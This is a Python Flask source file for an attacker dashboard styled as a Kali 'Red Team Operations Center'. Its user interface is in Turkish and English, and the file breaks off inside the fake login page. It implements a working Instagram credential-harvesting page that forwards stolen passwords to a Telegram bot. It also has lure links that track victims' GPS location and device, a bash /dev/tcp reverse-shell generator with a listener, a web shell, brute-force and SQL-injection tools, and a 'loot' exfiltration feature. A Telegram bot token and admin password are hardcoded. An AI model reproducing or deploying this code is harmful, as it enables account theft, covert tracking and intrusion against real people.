import os
import time
import socket
import ssl
import urllib.parse
import requests
import threading
import subprocess
import re
import csv
import zipfile
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
from datetime import datetime
from fpdf import FPDF
import io

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9082287913:AAEw9lMwKXfRTGf4LzQiF1UEgLZDHzNuc8o")
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_USER = "root1"
ADMIN_PASS = "toor1"

SITE_DATABASE = []
CLICK_LOGS = []
CREDENTIAL_LOGS = []
SCHEDULED_TARGETS = []
NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

app = Flask(__name__)
app.secret_key = "kali_linux_secret_key_998877"

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <style>
        body { background-color: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #121824; padding: 40px; border-radius: 6px; border: 1px solid #00ff66; box-shadow: 0 0 25px rgba(0,255,102,0.2); width: 350px; text-align: center; }
        h2 { color: #38bdf8; margin-bottom: 25px; text-shadow: 0 0 10px rgba(56,189,248,0.4); }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 15px; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #00ff66; box-shadow: 0 0 8px rgba(0,255,102,0.4); }
        button { width: 100%; padding: 12px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; font-family: 'Courier New', Courier, monospace; transition: 0.2s; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        .error { color: #f87171; margin-bottom: 15px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>kali@root-terminal:~#</h2>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <div class="input-group"><label>Username</label><input type="text" name="username" required autofocus></div>
            <div class="input-group"><label>Password</label><input type="password" name="password" required></div>
            <button type="submit">Authenticate</button>
        </form>
    </div>
</body>
</html>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { background-color: #090d14; color: #e2e8f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
        .container { max-width: 1350px; margin: 0 auto; background: #121824; padding: 25px; border-radius: 8px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
        h1 { color: #38bdf8; margin: 0; font-size: 22px; text-shadow: 0 0 10px rgba(56,189,248,0.3); }
        .logout-btn { background: #991b1b; color: white; padding: 6px 14px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
        .logout-btn:hover { background: #7f1d1d; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; background: #0a0e17; padding: 8px; border-radius: 6px; border: 1px solid #1e293b; }
        .tab-btn { background: #1a2332; color: #94a3b8; border: 1px solid #283548; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.2s; font-size: 12px; font-family: 'Courier New', Courier, monospace; }
        .tab-btn:hover { background: #283548; color: #fff; }
        .tab-btn.active { background: #0284c7; color: white; border-color: #38bdf8; box-shadow: 0 0 8px rgba(56,189,248,0.4); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .form-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
        label { color: #38bdf8; font-size: 13px; font-weight: bold; }
        input[type="text"], select, textarea, input[type="file"], input[type="number"], input[type="password"] { padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 14px; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus, textareaFocus { border-color: #38bdf8; box-shadow: 0 0 6px rgba(56,189,248,0.3); }
        textarea { resize: vertical; height: 100px; }
        button { padding: 12px 20px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; transition: 0.2s; font-weight: bold; font-family: 'Courier New', Courier, monospace; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        button.secondary { background: #0d9488; }
        button.success { background: #15803d; }
        button.danger { background: #b91c1c; }
        .terminal { background: #05070a; color: #00ff66; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; white-space: pre-wrap; font-family: 'Courier New', Courier, monospace; margin-top: 15px; max-height: 480px; overflow-y: auto; font-size: 13px; line-height: 1.4; box-shadow: inset 0 0 15px rgba(0,0,0,0.8); }
        .loading { color: #facc15; font-style: italic; font-weight: bold; font-size: 14px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #0a0e17; border-radius: 6px; overflow: hidden; border: 1px solid #1e293b; }
        th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; vertical-align: middle; }
        th { background: #0284c7; color: white; }
        tr:hover { background: #161f30; }
        .mini-map { width: 180px; height: 110px; border-radius: 4px; border: 1px solid #334155; display: inline-block; }
        .payload-box { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; }
        .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-bar">
            <h1>kali@kali-linux:~/red-team-ops#</h1>
            <a href="/logout" class="logout-btn">[x] Logout</a>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
            <button class="tab-btn" onclick="switchTab('phishTab')">📸 Insta Phishing</button>
            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS Tracker</button>
            <button class="tab-btn" onclick="switchTab('crackerTab')">🔑 Hash Cracker</button>
            <button class="tab-btn" onclick="switchTab('shellListenerTab')">💻 Shell Listener</button>
            <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram</button>
            <button class="tab-btn" onclick="switchTab('wifiTab')">📶 Wi-Fi Audit</button>
            <button class="tab-btn" onclick="switchTab('niktoTab')">🛡️ Nikto</button>
            <button class="tab-btn" onclick="switchTab('dnsTab')">🌍 DNS Dig</button>
            <button class="tab-btn" onclick="switchTab('sqlmapTab')">⚡ SQLmap</button>
            <button class="tab-btn" onclick="switchTab('subdomainTab')">🌐 Subdomain</button>
            <button class="tab-btn" onclick="switchTab('bruteTab')">🔐 Brute</button>
            <button class="tab-btn" onclick="switchTab('shellTab')">💻 Web Shell</button>
            <button class="tab-btn" onclick="switchTab('lootingTab')">🏴‍☠️ Looting</button>
            <button class="tab-btn" onclick="switchTab('analysisTab')">🔍 Secret</button>
            <button class="tab-btn" onclick="switchTab('payloadTab')">🛠️ Payloads</button>
            <button class="tab-btn" onclick="switchTab('dataTab')">📁 Archive</button>
        </div>

        <!-- 1. Keşif -->
        <div id="scanTab" class="tab-content active">
            <div class="form-group"><label>Target URL / IP:</label><input type="text" id="targetUrl" placeholder="example.com"></div>
            <button onclick="startScan(false)">Execute Comprehensive Recon</button>
            <div id="status" class="loading" style="margin-top: 15px;"></div>
            <div class="actions" id="actionButtons" style="display:none; gap:10px; margin-top:15px;">
                <button class="secondary" onclick="downloadReport('txt')">📥 Save TXT</button>
                <button class="danger" onclick="downloadReport('pdf')">📄 Export PDF</button>
                <button class="success" onclick="sendToTelegram()">📤 Send to Telegram</button>
            </div>
            <div id="results" class="terminal" style="display:none;"></div>
        </div>

        <!-- Instagram Phishing Sekmesi -->
        <div id="phishTab" class="tab-content">
            <h3>📸 Instagram Phishing & Credential Harvester</h3>
            <p style="color: #94a3b8; font-size: 13px;">Hedef kullanıcıya atılacak sahte Instagram giriş linkini kopyalayın. Şifreyi girenlerin bilgileri anında panele düşer.</p>
            <div class="form-group"><label>Sahte Instagram Giriş Linki:</label><input type="text" id="instaLink" readonly style="color: #38bdf8;"></div>
            <button class="success" onclick="generateInstaLink()">Link Üret</button>
            <h4 style="margin-top: 25px;">🎯 Yakalanan Instagram Hesap Bilgileri:</h4>
            <div id="credsContainer"><p style='color: #94a3b8;'>Henüz yakalanan hesap yok.</p></div>
        </div>

        <!-- Lure Link & Tracker Sekmesi -->
        <div id="lureTab" class="tab-content">
            <h3>🎯 Lure Link Generator & GPS/Device Tracker</h3>
            <div class="form-group"><label>Kampanya Başlığı:</label><input type="text" id="lureTitle" value="Özel Güvenlik Raporu ve Ödül Doğrulama"></div>
            <button class="success" onclick="generateLureLink()">Takip Linki Üret</button>
            <div class="form-group" style="margin-top: 20px;"><label>Oluşturulan Takip Linki:</label><input type="text" id="generatedLink" readonly style="color: #38bdf8;"></div>
            <h4 style="margin-top: 25px;">🔗 Yakalanan Ziyaretçi & GPS Logları:</h4>
            <div id="clickLogsContainer"><p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p></div>
        </div>

        <!-- Hash Cracker Sekmesi -->
        <div id="crackerTab" class="tab-content">
            <h3>🔑 Hash Cracker & Şifre Çözücü</h3>
            <div class="form-group"><label>Hash Tipi:</label><select id="hashType"><option value="md5">MD5</option><option value="sha256">SHA-256</option></select></div>
            <div class="form-group"><label>Hedef Hash:</label><input type="text" id="targetHash" placeholder="örn: 5d41402abc4b2a76b9719d911017c592"></div>
            <div class="form-group"><label>Wordlist (Her satıra bir şifre):</label><textarea id="wordlistArea">admin\n123456\npassword\nroot1\ntoor1\nhello\nsecret\nkali</textarea></div>
            <button class="danger" onclick="startHashCrack()">Hash Çözmeyi Başlat</button>
            <div id="crackResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <!-- Shell Listener Sekmesi -->
        <div id="shellListenerTab" class="tab-content">
            <h3>💻 Reverse Shell Dinleyicisi (Multi-Handler)</h3>
            <p style="color: #94a3b8; font-size: 13px;">Sunucu üzerinde belirtilen portu dinlemeye alarak gelen reverse shell bağlantılarını yönetin.</p>
            <div class="form-group"><label>Dinlenecek Port (LPORT):</label><input type="number" id="listenerPort" value="4444"></div>
            <button class="success" onclick="startListener()">Dinlemeyi Başlat</button>
            <div id="listenerStatus" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <!-- Telegram Test Sekmesi -->
        <div id="telegramTab" class="tab-content">
            <h3>🤖 Telegram Bot Notification Tester</h3>
            <div class="form-group"><label>Telegram Chat ID:</label><input type="text" id="testChatId" value="{{ default_chat_id }}" placeholder="örn: 123456789"></div>
            <button class="success" onclick="sendTelegramTest()">🚀 Test Mesajı Gönder</button>
            <div id="telegramTestStatus" class="terminal" style="display:none; margin-top: 15px;"></div>
        </div>

        <!-- Wi-Fi Denetim Sekmesi -->
        <div id="wifiTab" class="tab-content">
            <h3>📶 Real Wi-Fi Audit & Interface Controller</h3>
            <div class="form-group"><label>Wireless Interface:</label><input type="text" id="wifiInterface" value="wlan0"></div>
            <div class="form-group"><label>Hedef BSSID / MAC:</label><input type="text" id="wifiBssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                <button class="secondary" onclick="runWifiAction('interfaces')">Interface Listele</button>
                <button class="danger" onclick="runWifiAction('monitor')">Monitor Mode Aç</button>
                <button class="success" onclick="runWifiAction('scan')">Ağları Tara</button>
            </div>
            <div id="wifiStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="wifiResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- Diğer Sekmeler -->
        <div id="niktoTab" class="tab-content">
            <h3>Nikto Web Vulnerability Scanner</h3>
            <div class="form-group"><label>Target URL:</label><input type="text" id="niktoTarget" placeholder="https://example.com"></div>
            <button class="secondary" onclick="startNiktoScan()">Run Nikto Module</button>
            <div id="niktoStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="niktoResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="dnsTab" class="tab-content">
            <h3>DNS & Zone Enumeration</h3>
            <div class="form-group"><label>Domain:</label><input type="text" id="dnsDomain" placeholder="example.com"></div>
            <button class="secondary" onclick="startDnsRecon()">Query DNS Records</button>
            <div id="dnsStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="dnsResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="sqlmapTab" class="tab-content">
            <h3>Automated SQL Injection (SQLmap Lite)</h3>
            <div class="form-group"><label>Vulnerable URL:</label><input type="text" id="sqlmapUrl" placeholder="https://example.com/page.php?id=1"></div>
            <button class="danger" onclick="startSqlmapLite()">Run SQLi Exploit Test</button>
            <div id="sqlmapStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="sqlmapResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="subdomainTab" class="tab-content">
            <h3>Gobuster Subdomain Brute-Forcer</h3>
            <div class="form-group"><input type="text" id="subDomainInput" placeholder="example.com"></div>
            <button onclick="startSubdomainScan()">Start Subdomain Brute</button>
            <div id="subStatus" class="loading"></div>
            <div id="subResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="bruteTab" class="tab-content">
            <h3>Login Form Fuzzing & Brute-Force</h3>
            <div class="form-group"><input type="text" id="loginUrl" placeholder="https://example.com/login.php"></div>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="usernameField" placeholder="User field" style="flex:1;"><input type="text" id="passwordField" placeholder="Pass field" style="flex:1;"></div>
            <div class="form-group"><textarea id="passwordList">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
            <button class="danger" onclick="startBruteForce()">Launch Brute Attack</button>
            <div id="bruteStatus" class="loading"></div>
            <div id="bruteResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="shellTab" class="tab-content">
            <h3>Interactive Web Shell (RCE)</h3>
            <div class="form-group"><input type="text" id="shellCommand" placeholder="id, uname -a, cat /etc/passwd"></div>
            <button class="danger" onclick="executeWebShell()">Execute Command</button>
            <div id="shellResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="lootingTab" class="tab-content">
            <h3>Exfiltrate Harvested Data (ZIP Archive)</h3>
            <div class="form-group"><select id="lootingTargetSelect"><option value="">No targets scanned yet...</option></select></div>
            <button class="success" onclick="downloadLootZip()">Download Loot ZIP</button>
        </div>

        <div id="analysisTab" class="tab-content">
            <h3>Secret & Credential Scanner</h3>
            <div class="form-group"><input type="file" id="analysisFile"></div>
            <button class="secondary" onclick="uploadAndAnalyzeFile()">Scan File for Secrets</button>
            <div id="analysisStatus" class="loading"></div>
            <div id="analysisResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="payloadTab" class="tab-content">
            <h3>Reverse Shell Generator</h3>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="attackerIp" placeholder="LHOST"><input type="text" id="attackerPort" placeholder="LPORT"><button onclick="generatePayloads()">Generate</button></div>
            <div class="payload-box"><b>Bash:</b><br><code id="bashPayload" style="color:#00ff66;">bash -i >& /dev/tcp/IP/PORT 0>&1</code></div>
        </div>

        <div id="dataTab" class="tab-content">
            <div class="export-bar" style="margin-bottom:15px;"><a href="/api/export/json" target="_blank"><button class="secondary">Export JSON</button></a> <a href="/api/export/csv" target="_blank"><button class="success">Export CSV</button></a></div>
            <h3>Operations Analytics</h3>
            <div class="dashboard-row">
                <div class="dashboard-card"><h4>Security Grade Distribution</h4><canvas id="gradeChart" style="max-height: 180px;"></canvas></div>
                <div class="dashboard-card"><h4>WAF Protection Status</h4><canvas id="wafChart" style="max-height: 180px;"></canvas></div>
            </div>
            <h3>Archived Targets</h3>
            <div id="databaseTableContainer">No archived data.</div>
        </div>
    </div>

    <script>
        let currentReportText = "", lastTarget = "", gradeChartInstance = null, wafChartInstance = null;
        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
            if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
            if(tabId === 'lureTab') loadClickLogs();
            if(tabId === 'phishTab') loadCreds();
        }
        function generateInstaLink() {
            document.getElementById('instaLink').value = window.location.origin + "/phish/instagram";
            alert("Instagram phishing linki üretildi!");
        }
        async function loadCreds() {
            let res = await fetch('/api/phish/creds');
            let data = await res.json();
            let container = document.getElementById('credsContainer');
            if(data.creds.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz yakalanan hesap yok.</p>"; return; }
            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Kullanıcı Adı / E-Posta</th><th>Şifre</th></tr></thead><tbody>`;
            data.creds.forEach(c => { html += `<tr><td>${c.time}</td><td><b>${c.ip}</b></td><td style="color:#38bdf8;">${c.username}</td><td style="color:#f87171;">${c.password}</td></tr>`; });
            html += `</tbody></table>`;
            container.innerHTML = html;
        }
        function generatePayloads() {
            let ip = document.getElementById('attackerIp').value || '10.0.0.1', port = document.getElementById('attackerPort').value || '4444';
            document.getElementById('bashPayload').innerText = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        }
        function generateLureLink() {
            let randomId = Math.random().toString(36).substring(2, 9);
            document.getElementById('generatedLink').value = window.location.origin + "/track/" + randomId;
            alert("Takip linki üretildi!");
        }
        async function loadClickLogs() {
            let res = await fetch('/api/lure/logs');
            let data = await res.json();
            let container = document.getElementById('clickLogsContainer');
            if(data.logs.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p>"; return; }
            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Cihaz</th><th>📍 GPS Mini Harita Konumu</th></tr></thead><tbody>`;
            data.logs.forEach((l, index) => { 
                let mapId = `map_${index}`;
                let locContent = l.lat ? `<div id="${mapId}" class="mini-map"></div><br><a href="https://maps.google.com/?q=${l.lat},${l.lon}" target="_blank" style="color:#38bdf8; font-size:11px;">Google Maps'te Aç</a>` : "Konum İzni Alınamadı";
                html += `<tr><td>${l.time}</td><td><b>${l.ip}</b></td><td>${l.ua}</td><td>${locContent}</td></tr>`; 
            });
            html += `</tbody></table>`;
            container.innerHTML = html;
            data.logs.forEach((l, index) => {
                if(l.lat && l.lon) {
                    let mapId = `map_${index}`;
                    setTimeout(() => {
                        let map = L.map(mapId, {attributionControl: false, zoomControl: false}).setView([l.lat, l.lon], 14);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                        L.marker([l.lat, l.lon]).addTo(map).bindPopup("📍 Hedef Konum").openPopup();
                    }, 100);
                }
            });
        }
        async function startHashCrack() {
            let type = document.getElementById('hashType').value;
            let targetHash = document.getElementById('targetHash').value.trim();
            let wordlist = document.getElementById('wordlistArea').value;
            let resultsDiv = document.getElementById('crackResults');
            if(!targetHash) { alert('Hash giriniz!'); return; }
            resultsDiv.style.display = "block";
            resultsDiv.innerHTML = "root@kali:~# Hash brute-force / cracking başlatıldı...";
            let res = await fetch('/api/crack-hash', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type, hash: targetHash, wordlist}) });
            let data = await res.json();
            resultsDiv.innerHTML = data.output;
        }
        async function startListener() {
            let port = document.getElementById('listenerPort').value;
            let statusDiv = document.getElementById('listenerStatus');
            statusDiv.style.display = "block";
            statusDiv.innerHTML = `root@kali:~# nc -lvnp ${port} dinlemesi başlatılıyor...`;
            let res = await fetch('/api/listener/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({port}) });
            let data = await res.json();
            statusDiv.innerHTML = data.output;
        }
        async function sendTelegramTest() {
            let chatId = document.getElementById('testChatId').value.trim();
            let statusDiv = document.getElementById('telegramTestStatus');
            if(!chatId) { alert('Chat ID giriniz!'); return; }
            statusDiv.style.display = "block";
            statusDiv.innerHTML = "root@kali:~# Telegram test mesajı gönderiliyor...";
            let res = await fetch('/api/telegram-test', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId}) });
            let data = await res.json();
            statusDiv.innerHTML = data.output;
        }
        async function runWifiAction(action) {
            let iface = document.getElementById('wifiInterface').value.trim();
            let bssid = document.getElementById('wifiBssid').value.trim();
            let statusDiv = document.getElementById('wifiStatus'), resultsDiv = document.getElementById('wifiResults');
            statusDiv.innerHTML = `root@kali:~# running wifi action [${action}] on ${iface}...`; resultsDiv.style.display = "none";
            let res = await fetch('/api/wifi-audit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action, iface, bssid}) });
            let data = await res.json();
            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.output;
        }
        async function startScan(targetOverride = false) {
            let url = targetOverride ? targetOverride : document.getElementById('targetUrl').value.trim();
            if(!url) { alert('Specify target!'); return; }
            if(targetOverride) { document.getElementById('targetUrl').value = url; switchTab('scanTab'); }
            lastTarget = url;
            let statusDiv = document.getElementById('status'), resultsDiv = document.getElementById('results');
            statusDiv.innerHTML = `root@kali:~# scanning ${url}...`; resultsDiv.style.display = "none";
            let res = await fetch('/api/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.report; currentReportText = data.report; document.getElementById('actionButtons').style.display = "flex";
        }
        async function startNiktoScan() {
            let url = document.getElementById('niktoTarget').value.trim();
            if(!url) { alert('Specify URL!'); return; }
            document.getElementById('niktoStatus').innerHTML = "Running Nikto web scan..."; document.getElementById('niktoResults').style.display = "none";
            let res = await fetch('/api/nikto', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            document.getElementById('niktoStatus').innerHTML = ""; document.getElementById('niktoResults').style.display = "block"; document.getElementById('niktoResults').innerHTML = data.report;
        }
        async function startDnsRecon() {
            let domain = document.getElementById('dnsDomain').value.trim();
            if(!domain) { alert('Specify domain!'); return; }
            document.getElementById('dnsStatus').innerHTML = "Querying DNS records..."; document.getElementById('dnsResults').style.display = "none";
            let res = await fetch('/api/dns', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('dnsStatus').innerHTML = ""; document.getElementById('dnsResults').style.display = "block"; document.getElementById('dnsResults').innerHTML = data.report;
        }
        async function startSqlmapLite() {
            let url = document.getElementById('sqlmapUrl').value.trim();
            if(!url) { alert('Specify URL!'); return; }
            document.getElementById('sqlmapStatus').innerHTML = "Injecting SQL payloads..."; document.getElementById('sqlmapResults').style.display = "none";
            let res = await fetch('/api/sqlmap', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            document.getElementById('sqlmapStatus').innerHTML = ""; document.getElementById('sqlmapResults').style.display = "block"; document.getElementById('sqlmapResults').innerHTML = data.report;
        }
        async function startSubdomainScan() {
            let domain = document.getElementById('subDomainInput').value.trim();
            document.getElementById('subStatus').innerHTML = "Enumerating subdomains...";
            let res = await fetch('/api/subdomain-scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('subStatus').innerHTML = ""; document.getElementById('subResults').style.display = "block"; document.getElementById('subResults').innerHTML = data.report;
        }
        async function startBruteForce() {
            let url = document.getElementById('loginUrl').value, userField = document.getElementById('usernameField').value, passField = document.getElementById('passwordField').value, passwords = document.getElementById('passwordList').value;
            document.getElementById('bruteStatus').innerHTML = "Executing brute-force...";
            let res = await fetch('/api/brute-force', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url, user_field: userField, pass_field: passField, passwords}) });
            let data = await res.json();
            document.getElementById('bruteStatus').innerHTML = ""; document.getElementById('bruteResults').style.display = "block"; document.getElementById('bruteResults').innerHTML = data.report;
        }
        async function executeWebShell() {
            let command = document.getElementById('shellCommand').value;
            let res = await fetch('/api/webshell', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({command}) });
            let data = await res.json();
            let el = document.getElementById('shellResults'); el.style.display = "block"; el.innerHTML = data.output;
        }
        async function loadSiteDatabase() {
            let res = await fetch('/api/all-data'); let data = await res.json();
            let select = document.getElementById('lootingTargetSelect');
            select.innerHTML = '<option value="">Select target...</option>' + data.database.map(i => `<option value="${i.target}">${i.target} (${i.files.length} files)</option>`).join('');
            let grades = {}, wafs = {};
            data.database.forEach(i => { grades[i.grade[0]] = (grades[i.grade[0]] || 0) + 1; wafs[i.waf.includes("Cloudflare")?"CF":"Standard"] = (wafs[i.waf.includes("Cloudflare")?"CF":"Standard"]||0)+1; });
            renderCharts(grades, wafs);
            document.getElementById('databaseTableContainer').innerHTML = data.database.length ? `<table><thead><tr><th>Time</th><th>Target</th><th>WAF</th><th>Grade</th><th>Action</th></tr></thead><tbody>` + data.database.map(i => `<tr><td>${i.time}</td><td><b>${i.target}</b></td><td>${i.waf}</td><td>${i.grade}</td><td><button onclick="startScan('${i.target}')">Re-Scan</button></td></tr>`).join('') + `</tbody></table>` : "No archive data.";
        }
        function downloadLootZip() {
            let target = document.getElementById('lootingTargetSelect').value;
            if(!target) { alert('Select target!'); return; }
            window.open(`/api/looting/zip?target=${encodeURIComponent(target)}`, '_blank');
        }
        function renderCharts(grades, wafs) {
            if(gradeChartInstance) gradeChartInstance.destroy(); if(wafChartInstance) wafChartInstance.destroy();
            gradeChartInstance = new Chart(document.getElementById('gradeChart').getContext('2d'), { type: 'bar', data: { labels: Object.keys(grades), datasets: [{data: Object.values(grades), backgroundColor: ['#16a34a','#38bdf8','#dc2626']}] }, options: {plugins:{legend:{display:false}}} });
            wafChartInstance = new Chart(document.getElementById('wafChart').getContext('2d'), { type: 'doughnut', data: { labels: Object.keys(wafs), datasets: [{data: Object.values(wafs), backgroundColor: ['#0284c7','#475569']}] } });
        }
        function downloadReport(type) {
            if(type === 'txt') {
                let a = document.createElement('a'); a.href = window.URL.createObjectURL(new Blob([currentReportText], {type: 'text/plain'})); a.download = 'report.txt'; a.click();
            } else { window.open(`/api/download-pdf?target=${encodeURIComponent(lastTarget)}`, '_blank'); }
        }
        async function sendToTelegram() {
            let chatId = prompt("Telegram Chat ID:"); if(!chatId) return;
            let res = await fetch('/api/telegram-send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, report: currentReportText}) });
            let data = await res.json(); alert(data.status);
        }
    </script>
</body>
</html>
"""

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("username") == ADMIN_USER and request.form.get("password") == ADMIN_PASS:
            session["logged_in"] = True; return redirect(url_for("index"))
        error = "Authentication failed!"
    return render_template_string(LOGIN_TEMPLATE, error=error)

@app.route("/logout")
def logout(): session.pop("logged_in", None); return redirect(url_for("login"))

@app.route("/")
def index():
    if not session.get("logged_in"): return redirect(url_for("login"))
    return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)

# --- INSTAGRAM PHISHING ROTE ---
@app.route("/phish/instagram", methods=["GET", "POST"])
def insta_phish():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        CREDENTIAL_LOGS.insert(0, {"time": timestamp, "ip": visitor_ip, "username": username, "password": password})
        if NOTIFY_CHAT_ID and TOKEN:
            try:
                msg = f"🚨 [CREDENTIAL HARVESTER] Instagram Hesabı Düştü!\nKullanıcı: {username}\nŞifre: {password}\nIP: {visitor_ip}"
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
            except: pass
        return redirect("https://www.instagram.com")
        
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>Giriş • Instagram</title>
        <style>
            body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-card { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 320px; text-align: center; border-radius: 1px; }
            h1 { font-family: cursive; margin-bottom: 30px; font-size: 32px; font-weight: normal; }
            input { width: 100%; padding: 10px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; outline: none; }
            input:focus { border-color: #a8a8a8; }
            button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: bold; margin-top: 10px; cursor: pointer; font-size: 14px; }
            button:hover { background: #1877f2; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <h1>Instagram</h1>
            <form method="POST">
                <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
